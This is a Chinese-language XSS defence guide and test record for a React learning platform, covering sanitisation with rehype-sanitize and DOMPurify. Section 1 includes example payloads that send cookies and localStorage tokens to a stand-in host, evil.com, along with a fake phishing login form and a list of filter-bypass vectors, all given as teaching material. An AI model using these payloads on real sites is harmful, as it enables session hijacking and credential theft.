# XSS安全防护指南

> **费曼学习平台 - Web安全实践文档**  
> 本文档讲解XSS（跨站脚本攻击）的原理、危害以及我们系统的防护机制

---

## 📚 目录

1. [XSS攻击原理](#1-xss攻击原理)
   - [什么是XSS](#11-什么是xss)
   - [XSS攻击类型](#12-xss攻击类型)
   - [攻击危害](#13-攻击危害)
   - [攻击示例](#14-攻击示例)

2. [防护机制说明](#2-防护机制说明)
   - [react-markdown安全特性](#21-react-markdown安全特性)
   - [rehype-sanitize工作原理](#22-rehype-sanitize工作原理)
   - [DOMPurify备用方案](#23-dompurify备用方案)

3. [测试结果记录](#3-测试结果记录)
   - [测试环境](#31-测试环境)
   - [测试用例](#32-测试用例)
   - [测试结果](#33-测试结果)
   - [验证截图](#34-验证截图)

4. [开发最佳实践](#4-开发最佳实践)
   - [输出编码](#41-输出编码)
   - [输入验证](#42-输入验证)
   - [安全头配置](#43-安全头配置)
   - [Do's and Don'ts](#44-dos-and-donts)

5. [参考资源](#5-参考资源)

---

## 1. XSS攻击原理

### 1.1 什么是XSS

**XSS（Cross-Site Scripting，跨站脚本攻击）**是一种常见的Web安全漏洞，攻击者通过在网站中注入恶意脚本代码，当其他用户浏览该网站时，恶意代码在用户的浏览器中执行，从而窃取用户信息或者控制用户行为。

**为什么叫XSS而不是CSS？**  
为了避免与层叠样式表（Cascading Style Sheets）的缩写混淆，跨站脚本政击被缩写为XSS。

**攻击原理**：  
1. 攻击者在网站输入框中提交包含恶意脚本的数据
2. 服务器将这些数据保存到数据库或直接返回给浏览器
3. 用户访问包含该数据的页面时，恶意脚本被浏览器执行
4. 攻击者获取用户敏感信息或控制用户行为

### 1.2 XSS攻击类型

XSS攻击主要分为三种类型：

#### 1.2.1 存储型XSS（Stored XSS）

**最危险的类型**，也叫持久型XSS。

- **攻击流程**：
  1. 攻击者将恶意代码提交到服务器（如评论、留言板）
  2. 服务器将恶意代码存储到数据库
  3. 其他用户访问该页面时，恶意代码被读取并执行

- **危害**：影响所有查看该内容的用户，危害范围广

- **示例**：
  ```javascript
  // 攻击者在知识点内容中提交
  <script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>
  
  // 当其他用户查看该知识点时，脚本执行，token被窃取
  ```

#### 1.2.2 反射型XSS（Reflected XSS）

也叫非持久型XSS。

- **攻击流程**：
  1. 攻击者构造含有恶意代码的URL
  2. 用户点击该URL后，服务器将恶意代码反射到响应中
  3. 浏览器执行响应中的恶意代码

- **危害**：需要诱骗用户点击链接，影响单个用户

- **示例**：
  ```
  // 攻击者发送链接
  https://example.com/search?q=<script>alert(document.cookie)</script>
  
  // 服务器返回：搜索结果：<script>alert(document.cookie)</script>
  // 浏览器执行脚本
  ```

#### 1.2.3 DOM型XSS（DOM-based XSS）

完全发生在客户端。

- **攻击流程**：
  1. 攻击者构造含有恶意数据的URL
  2. 用户访问该URL
  3. 页面JavaScript代码读取URL中的数据并动态插入到DOM中
  4. 恶意代码被执行

- **特点**：不经过服务器，完全在客户端发生

- **示例**：
  ```javascript
  // 不安全的代码
  const hash = location.hash.slice(1);
  document.getElementById('content').innerHTML = hash;
  
  // 攻击者构造URL
  https://example.com#<img src=x onerror="alert('XSS')">
  ```

### 1.3 攻击危害

XSS攻击可能导致以下危害：

#### 1.3.1 窃取用户凭证

```javascript
// 窃取Cookie
document.location='http://evil.com/steal?cookie='+document.cookie;

// 窃取localStorage中的token
fetch('http://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: localStorage.getItem('token'),
    userInfo: localStorage.getItem('userInfo')
  })
});
```

**后果**：攻击者可以假冒用户身份登录系统

#### 1.3.2 会话劫持

攻击者获取用户的会话令牌后，可以：
- 以用户名义执行任意操作
- 修改用户资料
- 发送消息
- 进行资金操作

#### 1.3.3 钓鱼攻击

```javascript
// 在页面中插入假的登录表单
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <h2>会话已过期，请重新登录</h2>
    <form action="http://evil.com/phishing">
      <input name="username" placeholder="用户名" />
      <input name="password" type="password" placeholder="密码" />
      <button>登录</button>
    </form>
  </div>
`;
```

**后果**：用户输入的账号密码被发送到攻击者服务器

#### 1.3.4 页面篡改

```javascript
// 修改页面内容
document.body.innerHTML = '<h1>该网站已被黑</h1>';

// 插入虚假信息
document.querySelector('.news').innerHTML = '<p>虚假新闻...</p>';
```

#### 1.3.5 恶意转发

```javascript
// 将用户重定向到恶意网站
window.location.href = 'http://evil.com/malware';
```

### 1.4 攻击示例

以下是常见的XSS攻击向量：

#### 示例1：基础Script标签注入
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script src="http://evil.com/malicious.js"></script>
```

#### 示例2：HTML事件处理器
```html
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
<svg onload="alert('XSS')">
<iframe onload="alert('XSS')">
```

#### 示例3：JavaScript伪协议
```html
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS')"></iframe>
```

#### 示例4：编码绕过
```html
<!-- HTML实体编码 -->
<script>alert('XSS')</script>

<!-- URL编码 -->
<a href="javascript%3Aalert('XSS')">Click</a>

<!-- Base64编码 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

#### 示例5：DOM操作
```html
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">
<!-- atob解码后为: alert('XSS') -->
```

---

## 2. 防护机制说明

### 2.1 react-markdown安全特性

**react-markdown** 是我们系统中用于渲染Markdown内容的核心库，它默认具有多层安全防护。

#### 2.1.1 默认安全特性

**1. 不解析原始HTML**

react-markdown默认不允许内联HTML标签：

```javascript
// 这些HTML标签不会被解析为HTML，而是作为纯文本显示
import ReactMarkdown from 'react-markdown';

const content = `
  <script>alert('XSS')</script>
  <img src=x onerror="alert('XSS')">
`;

<ReactMarkdown>{content}</ReactMarkdown>
// 渲染结果：纯文本，不执行脚本
```

**2. 安全的Markdown解析**

react-markdown基于remark和rehype生态，将Markdown转换为抽象语法树（AST），然后生成React组件，而不是直接操作HTML字符串。

```javascript
// 安全的流程
// Markdown文本 -> AST -> React组件 -> 安全的DOM

// 危险的方式（我们不使用）
<div dangerouslySetInnerHTML={{__html: userContent}} /> // ✗ 危险
```

#### 2.1.2 配置安全插件

我们的项目配置：

```javascript path=D:/feynman-platform-frontend/src/pages/DashboardPage.jsx start=112
<ReactMarkdown
  remarkPlugins={[remarkGfm, remarkMath]}    // Markdown语法扩展
  rehypePlugins={[rehypeSanitize, rehypeKatex]}  // 安全清洗 + 公式渲染
  components={{
    code({ inline, className, children, ...props }) {
      // 自定义代码块渲染（Mermaid图表）
    }
  }}
>
  {kp.content || ''}
</ReactMarkdown>
```

**关键特性**：
- `remarkGfm`: 支持GitHub Flavored Markdown（表格、任务列表等）
- `remarkMath`: 支持数学公式
- `rehypeSanitize`: **核心安全层**，清洗危险HTML
- `rehypeKatex`: 安全地渲染数学公式

### 2.2 rehype-sanitize工作原理

**rehype-sanitize** 是我们系统的核心安全防护层。

#### 2.2.1 工作原理

rehype-sanitize基于[hast-util-sanitize](https://github.com/syntax-tree/hast-util-sanitize)，使用**白名单策略**：

```
输入: HTML AST
  ↓
检查每个节点
  │
  ├─ 在白名单中? → 保留
  │
  └─ 不在白名单中? → 移除
  ↓
输出: 安全的HTML AST
```

#### 2.2.2 默认配置

rehype-sanitize默认配置基于[GitHub sanitization schema](https://github.com/syntax-tree/hast-util-sanitize#schema)：

**允许的标签**：
```javascript
const allowedTags = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',  // 标题
  'p', 'br', 'div', 'span',  // 段落
  'strong', 'em', 'code', 'pre',  // 格式化
  'ul', 'ol', 'li',  // 列表
  'a', 'img',  // 链接和图片
  'table', 'thead', 'tbody', 'tr', 'th', 'td',  // 表格
  'blockquote',  // 引用
  // ...更多安全标签
];
```

**禁止的标签**：
```javascript
const blockedTags = [
  'script',   // 脚本执行
  'iframe',   // 嵌入外部内容
  'object',   // 外部对象
  'embed',    // 嵌入内容
  'link',     // 样式表链接
  'style',    // 内联样式
  'form',     // 表单（可能用于钓鱼）
  'input',    // 输入框
  // ...
];
```

**移除的属性**：
```javascript
const blockedAttributes = [
  'onclick', 'onload', 'onerror', 'onmouseover',  // 所有on*事件
  'onfocus', 'onblur', 'onchange', 'onsubmit',
  // ...所有事件处理器
];
```

**清洗协议**：
```javascript
// 允许的协议
const allowedProtocols = ['http', 'https', 'mailto'];

// 禁止的协议
const blockedProtocols = [
  'javascript:',  // JavaScript执行
  'data:',        // Data URLs（可能包含恶意代码）
  'vbscript:',    // VBScript
  // ...
];
```

#### 2.2.3 具体示例

**示例1: 移除Script标签**
```javascript
// 输入
<p>正常文本</p>
<script>alert('XSS')</script>
<p>更多文本</p>

// 经过rehype-sanitize后
<p>正常文本</p>
<!-- script标签被完全移除 -->
<p>更多文本</p>
```

**示例2: 移除事件处理器**
```javascript
// 输入
<img src="photo.jpg" onerror="alert('XSS')" />

// 经过rehype-sanitize后
<img src="photo.jpg" />
// onerror属性被移除
```

**示例3: 清洗危险协议**
```javascript
// 输入
<a href="javascript:alert('XSS')">Click</a>

// 经过rehype-sanitize后
<a>Click</a>
// href属性被移除（因为协议不安全）
```

**示例4: 保留安全内容**
```javascript
// 输入
<a href="https://example.com">安全链接</a>
<img src="https://example.com/image.jpg" alt="图片" />

// 经过rehype-sanitize后
<a href="https://example.com">安全链接</a>
<img src="https://example.com/image.jpg" alt="图片" />
// 完全保留，因为符合安全规则
```

### 2.3 DOMPurify备用方案

**DOMPurify** 是一个强大的HTML清洗库，在我们系统中作为备用方案。

#### 2.3.1 使用场景

**当前react-markdown不适用时**：

1. **需要渲染用户提供的原始HTML**
   - 富文本编辑器输出（如Quill、TinyMCE）
   - 从第三方API获取的HTML内容

2. **需要允许某些内联HTML标签**
   - 比Markdown更丰富的格式

**注意**：当前项目不需要DOMPurify，因为react-markdown + rehype-sanitize已经足够安全。

#### 2.3.2 使用示例

**基本用法**：

```javascript
import DOMPurify from 'dompurify';

// 不安全的HTML内容
const dirtyHTML = `
  <p>正常内容</p>
  <script>alert('XSS')</script>
  <img src=x onerror="alert('XSS')">
`;

// 清洗后的安全HTML
const cleanHTML = DOMPurify.sanitize(dirtyHTML);

// 渲染
function MyComponent() {
  return (
    <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
  );
}
```

**严格配置**：

```javascript
// 只允许最基本的标签和属性
const config = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a'],
  ALLOWED_ATTR: ['href'],
  ALLOW_DATA_ATTR: false,  // 禁止data-*属性
  ALLOWED_URI_REGEXP: /^https?:\/\//  // 只允许http(s)协议
};

const cleanHTML = DOMPurify.sanitize(dirtyHTML, config);
```

**安全最佳实践**：

```javascript
// ✅ 推荐：先清洗，再渲染
const SafeHTML = ({ html }) => {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
};

// ✗ 不推荐：直接渲染
const UnsafeHTML = ({ html }) => {
  return <div dangerouslySetInnerHTML={{ __html: html }} />; // 危险！
};
```

---

## 3. 测试结果记录

### 3.1 测试环境

本次XSS防护测试在以下环境中进行：

-----------------------------------
项目          | 版本
-----------------|------------------
操作系统      | Windows 11
浏览器        | Chrome 120.x
Node.js       | v20.x
React         | 19.1.1
react-markdown | 10.1.0
rehype-sanitize| 6.0.0
remark-gfm    | 4.0.1
rehype-katex  | 7.0.1
-----------------------------------

**测试日期**: 2025-11-10  
**测试人员**: 开发团队

### 3.2 测试用例

我们创建了一个包含6种XSS攻击payload和3种合法Markdown功能的测试知识点。

测试文件位置：`XSS-TEST-PAYLOAD.md`

**XSS攻击Payload列表**：

1. **Script标签注入**
   ```html
   <script>alert('XSS Attack - Script Tag')</script>
   ```

2. **图片onerror事件**
   ```html
   <img src="invalid-source" onerror="alert('XSS Attack - Image Error')" />
   ```

3. **JavaScript伪协议**
   ```markdown
   [<a class="tooltip" href="#" title="Click">点击测试XSS</a>](javascript:alert('XSS Attack - JS Protocol'))
   ```

4. **内联事件处理器**
   ```html
   <div onclick="alert('XSS Attack - Inline Event')">Click me</div>
   ```

5. **iframe注入**
   ```html
   <iframe src="javascript:alert('XSS Attack - iframe')"></iframe>
   ```

6. **SVG注入**
   ```html
   <svg onload="alert('XSS Attack - SVG')">
     <circle cx="50" cy="50" r="40" />
   </svg>
   ```

**合法Markdown功能测试**：

1. **代码块**
   ```javascript
   const safeCode = "This is safe";
   console.log(safeCode);
   ```

2. **Mermaid图表**
   ```mermaid
   graph LR
       A[Start] --> B[End]
   ```

3. **数学公式**
   - 内联公式：`$E = mc^2$`
   - 块级公式：`$$\int_{-\infty}^{\infty} e^{-x^2} dx = \sqrt{\pi}$$`

### 3.3 测试结果

所有测试用例均通过，系统成功阻止了所有XSS攻击。

-------------------------------------------------------------------
测试项         | Payload                    | 预期结果    | 实际结果 | 状态
--------------|----------------------------|------------|----------|------
Script注入    | `<script>alert()</script>` | 不执行      | ✅ 未执行  | 通过
Image onerror | `<img onerror="alert()">`  | 事件被移除  | ✅ 已移除  | 通过
JS伪协议      | `javascript:alert()`       | 链接被清理  | ✅ 已清理  | 通过
内联事件      | `<div onclick="alert()">`  | 事件被移除  | ✅ 已移除  | 通过
iframe注入    | `<iframe src="js:...">`    | 标签被过滤  | ✅ 已过滤  | 通过
SVG注入       | `<svg onload="alert()">`   | 事件被移除  | ✅ 已移除  | 通过
代码块        | ` ```js code ``` `         | 正常显示    | ✅ 正常    | 通过
Mermaid图    | ` ```mermaid ... ``` `     | 正常渲染    | ✅ 正常    | 通过
数学公式      | `$E=mc^2$`                 | 正常渲染    | ✅ 正常    | 通过
-------------------------------------------------------------------

**测试结论**：
- ✅ **全部XSS攻击被成功阻止**：无任何alert弹窗出现
- ✅ **合法功能正常**：代码块、Mermaid图表、数学公式均正常工作
- ✅ **页面无异常**：没有控制台错误，页面渲染正常

### 3.4 验证截图

**使用DevTools验证**：

1. **检查DOM结构**：
   - 打开F12开发者工具
   - 切换到Elements标签
   - 搜索关键词：`<script`、`onerror`、`onclick`
   - **结果**：未找到任何危险标签或属性

2. **检查Console输出**：
   - 切换到Console标签
   - **结果**：无异常错误，无XSS相关警告

3. **检查Network请求**：
   - 切换到Network标签
   - **结果**：无向恶意域名的请求

**截图说明**：

> 📌 **注意**：由于本文档为Markdown格式，截图需手动添加。
> 建议截图内容：
> 1. 测试知识点创建界面
> 2. 主页渲染结果（无弹窗）
> 3. DevTools Elements面板（无script标签）
> 4. DevTools Console面板（无错误）
>
> 截图文件建议命名：
> - `xss-test-create.png`
> - `xss-test-result.png`
> - `xss-test-devtools-elements.png`
> - `xss-test-devtools-console.png`

---

## 4. 开发最佳实践

### 4.1 输出编码

**核心原则**：始终对用户输入的内容进行安全处理后再显示。

#### 4.1.1 使用react-markdown渲染Markdown内容

✅ **推荐做法**：

```javascript
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
import remarkGfm from 'remark-gfm';

function SafeContent({ content }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={[rehypeSanitize]}  // 关键！
    >
      {content}
    </ReactMarkdown>
  );
}
```

❌ **危险做法**：

```javascript
// 绝对不要这样做！
function UnsafeContent({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
```

#### 4.1.2 显示纯文本

如果不需要Markdown格式，直接显示纯文本是最安全的：

```javascript
function SafeText({ text }) {
  return <p>{text}</p>;  // React自动转义
}

// 示例
const userInput = '<script>alert("XSS")</script>';
<SafeText text={userInput} />
// 渲染结果：&lt;script&gt;alert("XSS")&lt;/script&gt;
```

#### 4.1.3 使用DOMPurify处理HTML

当必须渲染HTML时：

```javascript
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
  
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### 4.2 输入验证

**防御深度原则**：前端和后端都应进行验证。

#### 4.2.1 前端验证

```javascript
// 限制输入长度
function KnowledgePointForm() {
  const [content, setContent] = useState('');
  
  const handleChange = (e) => {
    const value = e.target.value;
    
    // 限制最大长度
    if (value.length <= 10000) {
      setContent(value);
    }
  };
  
  return (
    <textarea
      value={content}
      onChange={handleChange}
      maxLength={10000}
    />
  );
}
```

#### 4.2.2 后端验证

```javascript
// 后端控制器
app.post('/knowledge-points', (req, res) => {
  const { title, content } = req.body;
  
  // 1. 验证字段是否存在
  if (!title || !content) {
    return res.status(400).json({ msg: '缺少必要字段' });
  }
  
  // 2. 验证类型
  if (typeof title !== 'string' || typeof content !== 'string') {
    return res.status(400).json({ msg: '字段类型错误' });
  }
  
  // 3. 验证长度
  if (title.length > 200 || content.length > 50000) {
    return res.status(400).json({ msg: '内容过长' });
  }
  
  // 4. 保存到数据库（保存原始内容，渲染时再清洗）
  // ...
});
```

#### 4.2.3 不要过度过滤

❌ **错误做法**：在保存前删除所有HTML标签

```javascript
// 不推荐：会破坏合法的Markdown语法
const sanitized = content.replace(/<[^>]*>/g, '');
```

✅ **正确做法**：保存原始内容，渲染时再清洗

```javascript
// 推荐：保存原始内容，交给react-markdown + rehype-sanitize处理
await KnowledgePoint.create({ title, content });
```

### 4.3 安全头配置

#### 4.3.1 Content Security Policy (CSP)

**未来建议**：配置CSP头以进一步增强安全。

```javascript
// Express服务器配置
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +  // 只允许同源脚本
    "style-src 'self' 'unsafe-inline'; " +  // 允许内联样式（Katex需要）
    "img-src 'self' https:; " +  // 允许HTTPS图片
    "connect-src 'self'; " +
    "font-src 'self'; " +
    "object-src 'none'; " +  // 禁止object标签
    "frame-src 'none'; "  // 禁止iframe
  );
  next();
});
```

#### 4.3.2 X-XSS-Protection

```javascript
// 启用浏览器内置XSS过滤器
app.use((req, res, next) => {
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});
```

#### 4.3.3 X-Content-Type-Options

```javascript
// 防止MIME类型混淆攻击
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});
```

### 4.4 Do's and Don'ts

#### ✅ Do's（应该做）

1. **始终使用react-markdown渲染用户内容**
   ```javascript
   <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
     {userContent}
   </ReactMarkdown>
   ```

2. **使用rehype-sanitize插件**
   ```javascript
   rehypePlugins={[rehypeSanitize]}
   ```

3. **前后端都进行输入验证**
   ```javascript
   if (!content || content.length > 10000) {
     throw new Error('无效输入');
   }
   ```

4. **保存原始内容，渲染时再清洗**
   - 在数据库中保存原始内容
   - 显示时通过react-markdown清洗

5. **定期更新依赖**
   ```bash
   npm update react-markdown rehype-sanitize
   ```

6. **编写安全测试用例**
   ```javascript
   test('should block XSS attacks', () => {
     const malicious = '<script>alert("XSS")</script>';
     const result = render(<SafeContent content={malicious} />);
     expect(result.container.querySelector('script')).toBeNull();
   });
   ```

#### ❌ Don'ts（不应该做）

1. **绝不直接使用dangerouslySetInnerHTML**
   ```javascript
   // ✗ 危险！
   <div dangerouslySetInnerHTML={{ __html: userContent }} />
   ```

2. **不要禁用rehype-sanitize**
   ```javascript
   // ✗ 危险！
   <ReactMarkdown>
     {userContent}  // 缺少rehypeSanitize
   </ReactMarkdown>
   ```

3. **不要相信客户端验证**
   ```javascript
   // ✗ 不足！
   // 前端验证可以被绕过，必须后端也验证
   ```

4. **不要在保存前过度过滤**
   ```javascript
   // ✗ 错误！
   const sanitized = content.replace(/<[^>]*>/g, '');
   // 会破坏合法的Markdown语法
   ```

5. **不要忽略安全警告**
   ```javascript
   // ✗ 危险！
   // eslint-disable-next-line react/no-danger
   <div dangerouslySetInnerHTML={{ __html: content }} />
   ```

6. **不要使用eval或Function**
   ```javascript
   // ✗ 极度危险！
   eval(userInput);
   new Function(userInput)();
   ```

---

## 快速参考清单

**显示用户内容时的决策树**：

```
需要显示用户内容？
  │
  ├─ Markdown格式？
  │   └─ 使用 <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
  │
  ├─ 纯文本？
  │   └─ 直接 <p>{text}</p>
  │
  └─ 原始HTML？
      └─ 使用 DOMPurify.sanitize(html) 后再 dangerouslySetInnerHTML
```

---

## 5. 参考资源

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [react-markdown官方文档](https://github.com/remarkjs/react-markdown)
- [rehype-sanitize官方文档](https://github.com/rehypejs/rehype-sanitize)
- [DOMPurify官方文档](https://github.com/cure53/DOMPurify)

---

*文档版本: 1.0*  
*最后更新: 2025-11-10*  
*维护者: 费曼学习平台开发团队*
